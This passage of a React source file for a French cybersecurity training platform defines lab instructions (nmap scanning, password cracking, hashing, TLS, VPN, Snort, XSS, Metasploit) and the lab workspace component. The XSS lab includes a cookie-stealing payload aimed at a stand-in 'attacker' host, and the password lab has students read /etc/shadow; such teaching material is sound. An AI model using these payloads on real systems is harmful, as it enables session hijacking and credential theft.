        content: `Copiez un fichier depuis host-d vers base en utilisant scp :\n<code>scp -P 3333 localhost:copyfile.txt /home/ubuntu</code>\n\n<strong>Attention :</strong> Pour scp, utilisez <code>-P</code> majuscule (et non <code>-p</code> minuscule comme pour ssh).\n\nVérifiez que le fichier est bien copié :\n<code>ls -la copyfile.txt</code>\n<code>less copyfile.txt</code>`,
      },
    ],
  },

  'nmap-discovery': {
    title: 'Découverte réseau avec Nmap',
    overview: `Ce lab porte sur l'utilisation de l'utilitaire nmap pour découvrir des adresses IP d'hôtes et des numéros de port de services. Vous devrez scanner le réseau, identifier les services, puis vous connecter au service découvert.`,
    environment: `<strong>Objectif :</strong> Utiliser nmap pour découvrir un hôte et son port SSH non standard, puis s'y connecter pour récupérer un fichier contenant "fried shrimp project".`,
    steps: [
      {
        title: 'Tâche 1 : Découverte d\'hôtes',
        content: `Scannez le réseau pour trouver les hôtes actifs :\n<code>nmap -sn 172.25.0.0/24</code>\n\nNotez les adresses IP des hôtes découverts.`,
      },
      {
        title: 'Tâche 2 : Scan de ports',
        content: `Pour chaque hôte découvert, scannez les ports :\n<code>nmap -sV <adresse_ip></code>\n\nIdentifiez le service SSH qui tourne sur un port non standard.`,
      },
      {
        title: 'Tâche 3 : Connexion au service',
        content: `Connectez-vous au service SSH découvert :\n<code>ssh -p <port_découvert> ubuntu@<adresse_ip></code>\n\nRécupérez le fichier contenant les informations du "fried shrimp project".`,
      },
    ],
  },

  'pass-crack': {
    title: 'Cassage de mots de passe',
    overview: `Introduction aux mots de passe et aux méthodes élémentaires de cassage. Ce lab couvre plusieurs méthodologies de cassage et types de hash.`,
    environment: `<strong>Outils disponibles :</strong>\n- <code>chage</code> : gestion du vieillissement des mots de passe\n- <code>crackSHA.py</code> : cassage de hash SHA\n- <code>crackMD5.py</code> : cassage de hash MD5\n- <code>crack512.py</code> : cassage de hash SHA-512\n- <code>crackPre.py</code> : recherche par tables pré-calculées\n- <code>htpasswd</code> : gestion de fichiers de mots de passe Apache\n\n<strong>Documentation fournie :</strong> Manuel PDF, template de rapport, tableur de comparaison de vitesses de cassage.`,
    steps: [
      {
        title: 'Tâche 1 : Explorer /etc/shadow',
        content: `Examinez le fichier de stockage des mots de passe :\n<code>sudo cat /etc/shadow</code>\n\nIdentifiez :\n- Le format des entrées (utilisateur:hash:...)\n- L'algorithme de hachage utilisé (préfixe $1$=MD5, $5$=SHA-256, $6$=SHA-512)\n- Le sel (salt) utilisé\n\nUtilisez <code>chage</code> pour voir les politiques de mots de passe :\n<code>chage -l ubuntu</code>`,
      },
      {
        title: 'Tâche 2 : Cassage par dictionnaire',
        content: `Utilisez les scripts de cassage fournis :\n\nCassage MD5 :\n<code>python crackMD5.py</code>\n\nCassage SHA :\n<code>python crackSHA.py</code>\n\nCassage SHA-512 :\n<code>python crack512.py</code>\n\nNotez les différences de temps entre les algorithmes.`,
      },
      {
        title: 'Tâche 3 : Tables pré-calculées',
        content: `Utilisez les tables pré-calculées (rainbow tables) :\n<code>python crackPre.py</code>\n\nComparez la vitesse avec l'attaque par dictionnaire.\n\n<strong>Question :</strong> Pourquoi les tables pré-calculées sont-elles plus rapides ? Qu'est-ce qui les rend inefficaces quand un sel est utilisé ?`,
      },
      {
        title: 'Tâche 4 : Gestion Apache htpasswd',
        content: `Créez et gérez des mots de passe avec htpasswd :\n<code>htpasswd -c /tmp/passwords utilisateur1</code>\n\nExaminez le fichier créé et identifiez l'algorithme de hachage utilisé.`,
      },
    ],
  },

  'onewayhash': {
    title: 'Fonctions de hachage à sens unique',
    overview: `Exploration des fonctions de hachage cryptographiques : MD5, SHA-1, SHA-256. Propriétés, effet avalanche, collisions et applications pratiques.`,
    environment: `<strong>Outils :</strong> md5sum, sha1sum, sha256sum, OpenSSL`,
    steps: [
      {
        title: 'Tâche 1 : Calculer des empreintes',
        content: `Créez un fichier et calculez ses empreintes avec différents algorithmes :\n<code>echo "Message de test" > fichier.txt</code>\n<code>md5sum fichier.txt</code>\n<code>sha1sum fichier.txt</code>\n<code>sha256sum fichier.txt</code>\n\nAvec OpenSSL :\n<code>openssl dgst -md5 fichier.txt</code>\n<code>openssl dgst -sha256 fichier.txt</code>`,
      },
      {
        title: 'Tâche 2 : Observer l\'effet avalanche',
        content: `Modifiez un seul caractère et observez le changement complet du hash :\n<code>echo "Hello" | sha256sum</code>\n<code>echo "hello" | sha256sum</code>\n<code>echo "Hellp" | sha256sum</code>\n\nChaque modification minime produit un hash complètement différent.`,
      },
      {
        title: 'Tâche 3 : Résistance aux collisions',
        content: `Tentez de trouver deux messages avec le même hash (collision) :\n- MD5 est connu pour avoir des collisions pratiques\n- SHA-256 est considéré résistant aux collisions\n\nComprenez pourquoi MD5 est considéré obsolète pour les applications de sécurité.`,
      },
    ],
  },

  'pubkey': {
    title: 'Cryptographie à clé publique',
    overview: `Implémentation et utilisation de la cryptographie asymétrique : génération de clés RSA, chiffrement, signature et certificats X.509 avec OpenSSL.`,
    environment: `<strong>Outils :</strong> OpenSSL (génération de clés, chiffrement, signature, certificats)`,
    steps: [
      {
        title: 'Tâche 1 : Générer des clés RSA',
        content: `Générez une paire de clés RSA :\n<code>openssl genrsa -out private.pem 2048</code>\n<code>openssl rsa -in private.pem -pubout -out public.pem</code>\n\nExaminez les clés :\n<code>openssl rsa -in private.pem -text -noout</code>`,
      },
      {
        title: 'Tâche 2 : Chiffrement/Déchiffrement',
        content: `Chiffrez un message avec la clé publique :\n<code>echo "Message secret" > message.txt</code>\n<code>openssl rsautl -encrypt -pubin -inkey public.pem -in message.txt -out message.enc</code>\n\nDéchiffrez avec la clé privée :\n<code>openssl rsautl -decrypt -inkey private.pem -in message.enc -out message.dec</code>\n<code>cat message.dec</code>`,
      },
      {
        title: 'Tâche 3 : Signature numérique',
        content: `Signez un document :\n<code>openssl dgst -sha256 -sign private.pem -out signature.bin document.txt</code>\n\nVérifiez la signature :\n<code>openssl dgst -sha256 -verify public.pem -signature signature.bin document.txt</code>`,
      },
    ],
  },

  'ssl': {
    title: 'Protocole SSL/TLS',
    overview: `Compréhension du fonctionnement de SSL/TLS. Configuration de serveurs HTTPS, analyse du handshake TLS et gestion des certificats.`,
    environment: `<strong>Outils :</strong> OpenSSL, Wireshark, serveur web`,
    steps: [
      {
        title: 'Tâche 1 : Analyser le handshake TLS',
        content: `Capturez et analysez un handshake TLS avec Wireshark :\n- Filtrez avec <code>ssl</code> ou <code>tls</code>\n- Identifiez : ClientHello, ServerHello, Certificate, Key Exchange, Finished`,
      },
      {
        title: 'Tâche 2 : Créer une CA locale',
        content: `Créez une autorité de certification locale :\n<code>openssl req -x509 -new -nodes -keyout ca.key -sha256 -days 365 -out ca.crt</code>`,
      },
      {
        title: 'Tâche 3 : Configurer HTTPS',
        content: `Générez un certificat serveur signé par votre CA et configurez le serveur web pour HTTPS.`,
      },
    ],
  },

  'tcpip': {
    title: 'Protocoles TCP/IP',
    overview: `Étude en profondeur de la suite de protocoles TCP/IP. Analyse de trames Ethernet, paquets IP, segments TCP et datagrammes UDP.`,
    environment: `<strong>Outils :</strong> tcpdump, Wireshark, netcat`,
    steps: [
      {
        title: 'Tâche 1 : Analyser les en-têtes',
        content: `Capturez du trafic et examinez chaque couche :\n<code>sudo tcpdump -i eth0 -XX -c 10</code>\n\nIdentifiez :\n- En-tête Ethernet (MAC src/dst, EtherType)\n- En-tête IP (version, TTL, protocole, src/dst)\n- En-tête TCP (ports src/dst, flags, numéros de séquence)`,
      },
      {
        title: 'Tâche 2 : Three-way handshake TCP',
        content: `Observez le three-way handshake :\n<code>sudo tcpdump -i eth0 -S tcp</code>\n\nDans un autre terminal :\n<code>curl http://server/</code>\n\nIdentifiez les paquets SYN, SYN-ACK, ACK et les numéros de séquence.`,
      },
    ],
  },

  'routing-basics': {
    title: 'Bases du routage IP',
    overview: `Configuration du routage IP entre plusieurs sous-réseaux. Tables de routage, passerelles et routage statique.`,
    environment: `<strong>Plusieurs conteneurs</strong> formant une topologie réseau avec routeurs et sous-réseaux.`,
    steps: [
      {
        title: 'Tâche 1 : Lire les tables de routage',
        content: `Affichez la table de routage :\n<code>route -n</code>\n<code>ip route show</code>\n\nIdentifiez la passerelle par défaut, les routes directes et les routes statiques.`,
      },
      {
        title: 'Tâche 2 : Configurer le routage',
        content: `Ajoutez des routes statiques :\n<code>sudo ip route add 10.0.0.0/24 via 192.168.1.1</code>\n\nActivez le forwarding IP :\n<code>echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward</code>\n\nDiagnostiquez avec :\n<code>traceroute <destination></code>`,
      },
    ],
  },

  'vpnlab': {
    title: 'Réseaux privés virtuels (VPN) avec OpenVPN',
    overview: `Configuration d'un VPN avec OpenVPN. Tunnel chiffré, authentification par certificats et routage du trafic.`,
    environment: `<strong>Outils :</strong> OpenVPN, OpenSSL pour la PKI`,
    steps: [
      {
        title: 'Tâche 1 : Configurer le serveur OpenVPN',
        content: `Installez et configurez le serveur :\n- Générez les certificats (CA, serveur, client)\n- Configurez le fichier server.conf\n- Démarrez le service OpenVPN`,
      },
      {
        title: 'Tâche 2 : Connecter le client',
        content: `Configurez et connectez le client VPN :\n- Copiez les certificats nécessaires\n- Configurez client.conf\n- Établissez le tunnel\n- Vérifiez le chiffrement avec tcpdump`,
      },
    ],
  },

  'snort': {
    title: 'Détection d\'intrusion avec Snort IDS',
    overview: `Configuration du système de détection d'intrusion Snort. Écriture de règles de détection, analyse d'alertes et compréhension IDS vs IPS.`,
    environment: `<strong>Outils :</strong> Snort, tcpdump`,
    steps: [
      {
        title: 'Tâche 1 : Configurer Snort',
        content: `Examinez la configuration Snort :\n<code>cat /etc/snort/snort.conf</code>\n\nLancez Snort en mode IDS :\n<code>sudo snort -A console -q -c /etc/snort/snort.conf -i eth0</code>`,
      },
      {
        title: 'Tâche 2 : Écrire des règles',
        content: `Créez des règles de détection personnalisées :\n<code>sudo nano /etc/snort/rules/local.rules</code>\n\nExemple :\n<code>alert tcp any any -> $HOME_NET 80 (msg:"HTTP GET détecté"; content:"GET"; sid:1000001; rev:1;)</code>\n\nRedémarrez Snort et générez du trafic pour tester.`,
      },
    ],
  },

  'xsite': {
    title: 'Cross-Site Scripting (XSS)',
    overview: `Exploitation des vulnérabilités XSS dans une application web. XSS réfléchi, stocké et DOM-based.`,
    environment: `<strong>Application web vulnérable</strong> avec formulaires non sanitisés.`,
    steps: [
      {
        title: 'Tâche 1 : XSS Réfléchi',
        content: `Identifiez un champ vulnérable et injectez du JavaScript :\n<code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>\n\nObservez l'exécution du script dans le navigateur.`,
      },
      {
        title: 'Tâche 2 : Vol de cookies',
        content: `Créez un payload qui exfiltre les cookies de session :\n<code>&lt;script&gt;document.location='http://attacker/?c='+document.cookie&lt;/script&gt;</code>\n\nComprenez les contre-mesures : CSP, HttpOnly, échappement des entrées.`,
      },
    ],
  },

  'metasploit': {
    title: 'Introduction à Metasploit',
    overview: `Découverte du framework Metasploit pour les tests d'intrusion. Exploitation de vulnérabilités, utilisation de payloads et post-exploitation.`,
    environment: `<strong>Outils :</strong> msfconsole, nmap\n<strong>Base :</strong> Image Kali Linux avec Metasploit pré-installé`,
    steps: [
      {
        title: 'Tâche 1 : Explorer Metasploit',
        content: `Lancez la console :\n<code>msfconsole</code>\n\nRecherchez des exploits :\n<code>search type:exploit platform:linux</code>\n\nAffichez les informations :\n<code>info <exploit_name></code>`,
      },
      {
        title: 'Tâche 2 : Configurer et lancer un exploit',
        content: `Sélectionnez un exploit :\n<code>use <exploit_path></code>\n\nConfigurez les options :\n<code>set RHOSTS <target_ip></code>\n<code>set PAYLOAD <payload_name></code>\n\nLancez :\n<code>exploit</code>`,
      },
    ],
  },

  'capabilities': {
    title: 'Capabilities Linux',
    overview: `Exploration du mécanisme des capabilities Linux comme alternative granulaire au bit SUID et aux privilèges root complets.`,
    environment: `<strong>Outils :</strong> getcap, setcap, capsh`,
    steps: [
      {
        title: 'Tâche 1 : Comprendre SUID vs Capabilities',
        content: `Trouvez les binaires SUID :\n<code>find / -perm -4000 2>/dev/null</code>\n\nTrouvez les binaires avec capabilities :\n<code>getcap -r / 2>/dev/null</code>\n\nComparez les risques de sécurité.`,
      },
      {
        title: 'Tâche 2 : Attribuer des capabilities',
        content: `Donnez la capability CAP_NET_RAW à un programme :\n<code>sudo setcap cap_net_raw+ep /usr/bin/ping</code>\n\nVérifiez :\n<code>getcap /usr/bin/ping</code>`,
      },
    ],
  },
};

// Instructions par défaut pour les labs sans instructions spécifiques
const DEFAULT_INSTRUCTIONS = {
  title: 'Lab',
  overview: '',
  environment: '',
  steps: [
    {
      title: 'Étape 1 : Explorer l\'environnement',
      content: `Commencez par explorer l'environnement du lab. Listez les fichiers et consultez la documentation.\n\n<code>ls -la /lab/</code>\n<code>cat /lab/docs/read_first.txt</code>`,
    },
    {
      title: 'Étape 2 : Suivre les instructions',
      content: `Consultez le fichier PDF d'instructions dans le répertoire docs/ du lab pour les détails spécifiques de l'exercice.`,
    },
    {
      title: 'Étape 3 : Réaliser les exercices',
      content: `Suivez les instructions étape par étape. N'hésitez pas à expérimenter et à utiliser les pages man.\n\n<code>man &lt;commande&gt;</code>`,
    },
    {
      title: 'Soumission',
      content: `Quand vous avez terminé, arrêtez le lab :\n<code>stoplab</code>\n\nCela crée le fichier de résultats pour l'évaluation.`,
    },
  ],
};

export default function LabWorkspace({ token }) {
  const { id } = useParams();
  const navigate = useNavigate();
  const [containers, setContainers] = useState([]);
  const [activeContainer, setActiveContainer] = useState(null);
  const [lab, setLab] = useState(null);
  const [stopping, setStopping] = useState(false);
  const [grading, setGrading] = useState(false);
  const [gradeResult, setGradeResult] = useState(null);
  const [setupReady, setSetupReady] = useState(false);

  const instructions = LAB_INSTRUCTIONS[id] || DEFAULT_INSTRUCTIONS;

  useEffect(() => {
    fetch(`/api/labs/${id}`).then(r => r.json()).then(setLab);

    fetch(`/api/labs/${id}/containers`, {
      headers: { Authorization: `Bearer ${token}` },
    })
      .then(r => r.json())
      .then(data => {
        const running = (Array.isArray(data) ? data : []).filter(c => c.state === 'running');
        setContainers(running);
        if (running.length > 0) setActiveContainer(running[0].id);
      });
  }, [id, token]);

  // Vérifier périodiquement si le setup est terminé
  useEffect(() => {
    if (setupReady || containers.length === 0) return;
    const interval = setInterval(() => {
      fetch(`/api/labs/${id}/status`, { headers: { Authorization: `Bearer ${token}` } })
        .then(r => r.json())
        .then(data => {
          if (data.ready) {
            setSetupReady(true);
            clearInterval(interval);
          }
        })
        .catch(() => {});
    }, 5000);
    return () => clearInterval(interval);
  }, [id, token, containers, setupReady]);

  const handleStop = async () => {
    setStopping(true);
    await fetch(`/api/labs/${id}/stop`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${token}` },
    });
    navigate(`/labs/${id}`);
  };

  const handleGrade = async () => {
    setGrading(true);
    try {
      const res = await fetch(`/api/labs/${id}/grade`, {
        method: 'POST',
        headers: { Authorization: `Bearer ${token}` },
      });
      const data = await res.json();
      setGradeResult(data);
    } catch (err) {
      console.error(err);
    } finally {
      setGrading(false);
    }
  };

  return (
    <div className="workspace">
      {/* Panneau d'instructions */}
      <div className="workspace-instructions">
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px' }}>
          <h2>{instructions.title}</h2>
          <button className="btn btn-sm btn-secondary" onClick={() => navigate(`/labs/${id}`)}>
            Retour
          </button>
        </div>

        {/* Indicateur de setup */}
        {containers.length > 0 && !setupReady && (
          <div style={{ marginBottom: '16px', padding: '12px 16px', background: 'rgba(255, 171, 64, 0.1)', border: '1px solid rgba(255, 171, 64, 0.3)', borderRadius: 'var(--radius-sm)', display: 'flex', alignItems: 'center', gap: '10px' }}>
            <div className="spinner" style={{ width: '16px', height: '16px', borderWidth: '2px' }} />
            <span style={{ fontSize: '13px', color: 'var(--warning)' }}>Installation des outils en cours (~30s)...</span>
          </div>
        )}
        {containers.length > 0 && setupReady && (
          <div style={{ marginBottom: '16px', padding: '12px 16px', background: 'rgba(0, 230, 118, 0.1)', border: '1px solid rgba(0, 230, 118, 0.3)', borderRadius: 'var(--radius-sm)' }}>
            <span style={{ fontSize: '13px', color: 'var(--success)' }}>Lab prêt — tous les outils sont installés</span>
          </div>
        )}

        {/* Vue d'ensemble du cours */}
        {instructions.overview && (
          <div style={{ marginBottom: '20px', padding: '16px', background: 'var(--bg-card)', borderRadius: 'var(--radius-sm)', borderLeft: '3px solid var(--accent)' }}>
            <h3 style={{ fontSize: '14px', color: 'var(--accent)', marginBottom: '8px' }}>Vue d'ensemble</h3>
            <p style={{ fontSize: '13px', color: 'var(--text-secondary)', lineHeight: 1.6 }}>
              {instructions.overview}
            </p>
          </div>
        )}

        {/* Environnement du lab */}
        {instructions.environment && (
          <div style={{ marginBottom: '20px', padding: '16px', background: 'rgba(0, 212, 255, 0.05)', borderRadius: 'var(--radius-sm)', border: '1px solid rgba(0, 212, 255, 0.15)' }}>
            <h3 style={{ fontSize: '14px', color: 'var(--success)', marginBottom: '8px' }}>Environnement</h3>
            <div
              style={{ fontSize: '12px', color: 'var(--text-secondary)', lineHeight: 1.7, fontFamily: 'var(--font)' }}
              dangerouslySetInnerHTML={{ __html: instructions.environment.replace(/\n/g, '<br/>') }}
            />
          </div>
        )}

        {/* Étapes du cours */}
        {instructions.steps.map((step, i) => (
          <div key={i} className="step">
            <h3>{step.title}</h3>
            <div
              style={{ fontSize: '13px', color: 'var(--text-secondary)', lineHeight: 1.7 }}
              dangerouslySetInnerHTML={{ __html: step.content.replace(/\n/g, '<br/>') }}
            />
          </div>
        ))}

        {/* Actions */}
        <div style={{ marginTop: '24px', display: 'flex', flexDirection: 'column', gap: '10px' }}>
          <button
            className="btn btn-success"
            onClick={handleGrade}
            disabled={grading}
            style={{ justifyContent: 'center' }}
          >
            {grading ? 'Évaluation...' : 'Vérifier mon travail'}
          </button>

          {gradeResult && (
            <div style={{
              padding: '16px',
              background: 'var(--bg-card)',
              borderRadius: 'var(--radius-sm)',
              border: `1px solid ${gradeResult.score >= 70 ? 'var(--success)' : 'var(--warning)'}`,
            }}>
              <div style={{ fontSize: '24px', fontWeight: 700, textAlign: 'center', color: gradeResult.score >= 70 ? 'var(--success)' : 'var(--warning)' }}>
                {gradeResult.score}%
              </div>
              <p style={{ fontSize: '13px', color: 'var(--text-secondary)', textAlign: 'center', marginTop: '4px' }}>
                {gradeResult.score >= 70 ? 'Lab réussi !' : 'Continuez vos efforts...'}
              </p>
              {gradeResult.goals && gradeResult.goals.length > 0 && (
                <div style={{ marginTop: '12px' }}>
                  {gradeResult.goals.map((g, i) => (
                    <div key={i} style={{ fontSize: '12px', padding: '4px 0', display: 'flex', gap: '8px', alignItems: 'center' }}>
                      <span style={{ color: g.status === 'achieved' ? 'var(--success)' : 'var(--text-muted)' }}>
                        {g.status === 'achieved' ? '[OK]' : '[  ]'}
                      </span>
                      <span style={{ color: 'var(--text-secondary)', fontFamily: 'var(--font-mono)' }}>{g.goal}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}

          <button
            className="btn btn-danger"
            onClick={handleStop}
            disabled={stopping}
            style={{ justifyContent: 'center' }}
          >
            {stopping ? 'Arrêt...' : 'Arrêter le lab'}
          </button>
        </div>
      </div>

      {/* Topologie + Terminal */}
      <div className="workspace-terminal">
        {/* Schéma réseau au-dessus du terminal — clic sur un noeud = bascule vers son terminal */}
        <NetworkTopology labId={id} onNodeClick={(nodeId) => {
          // Chercher le conteneur dont le nom contient l'id du noeud cliqué
          const match = containers.find(c => {
            const name = (c.container || c.name || '').toLowerCase();
            const nid = nodeId.toLowerCase();
            return name.includes(nid) || nid.includes(name.replace(/.*[-_]/, ''));
          });
          if (match) setActiveContainer(match.id);
        }} />

        <div className="terminal-header">
          <div className="terminal-tabs">
            {containers.map(c => (
              <button
                key={c.id}
                className={`terminal-tab ${activeContainer === c.id ? 'active' : ''}`}
                onClick={() => setActiveContainer(c.id)}
              >
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0 }}>
                  <polyline points="4 17 10 11 4 5" />
                  <line x1="12" y1="19" x2="20" y2="19" />
                </svg>
                {c.container || c.name}
              </button>
            ))}
            {containers.length === 0 && (
              <span style={{ fontSize: '13px', color: 'var(--text-muted)' }}>
                Aucun conteneur actif — démarrez le lab d'abord
              </span>
            )}
          </div>
          <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
            {containers.length > 0 && (
              <span className="badge badge-success">
                <svg width="10" height="10" viewBox="0 0 24 24" fill="currentColor" style={{ marginRight: '4px' }}>
                  <circle cx="12" cy="12" r="6" />
                </svg>
                Connecté
              </span>
            )}
          </div>
        </div>

        {containers.length > 0 ? (
          containers.map(c => (
            <div
              key={c.id}
              style={{
                display: activeContainer === c.id ? 'block' : 'none',
                width: '100%',
                height: '100%',
              }}
            >
              <Terminal containerId={c.id} token={token} />
            </div>
          ))
        ) : (
          <div style={{
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            height: '100%',
            color: 'var(--text-muted)',
            flexDirection: 'column',
            gap: '12px',
          }}>
            <div style={{ fontSize: '48px' }}>$_</div>
            <p>Le terminal se connectera automatiquement au conteneur du lab</p>
          </div>
        )}
      </div>
    </div>
  );
}
